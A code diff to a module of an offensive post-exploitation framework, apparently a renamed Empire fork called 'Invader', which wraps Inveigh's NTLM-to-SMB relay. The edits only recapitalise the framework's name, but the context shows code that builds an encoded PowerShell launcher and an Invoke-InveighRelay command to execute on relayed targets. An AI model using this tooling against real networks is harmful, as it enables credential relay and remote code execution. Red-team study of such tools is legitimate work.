@@ -12,10 +12,10 @@ class Module:
             'Description': ('Inveigh\'s SMB relay function. This module can be used to relay incoming '
                             'HTTP/Proxy NTLMv1/NTLMv2 authentication requests to an SMB target. If the '
                             'authentication is successfully relayed and the account has the correct '
-                            'privilege, a specified command or invader launcher will be executed on the '
+                            'privilege, a specified command or Invader launcher will be executed on the '
 							'target PSExec style. This module works best while also running collection/inveigh '
 							'with HTTP disabled. Note that this module exposes only a subset of Inveigh '
-							'Relay\'s parameters. Inveigh Relay can be used through invader\'s scriptimport '
+							'Relay\'s parameters. Inveigh Relay can be used through Invader\'s scriptimport '
 							'and scriptcmd if additional parameters are needed.'),
 
             'Background' : True,
@@ -75,7 +75,7 @@ class Module:
                 'Value'         :   ''
             },
 			'ConsoleStatus' : {
-                'Description'   :   'Interval in minutes for displaying all unique captured hashes and credentials. This will display a clean list of captures in invader.',
+                'Description'   :   'Interval in minutes for displaying all unique captured hashes and credentials. This will display a clean list of captures in Invader.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -177,7 +177,7 @@ class Module:
 
                 # generate the PowerShell one-liner with all of the proper options set
                 command = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-        # set defaults for invader
+        # set defaults for Invader
         scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \"%s\"' % (command)
 
 	for option,values in self.options.iteritems():
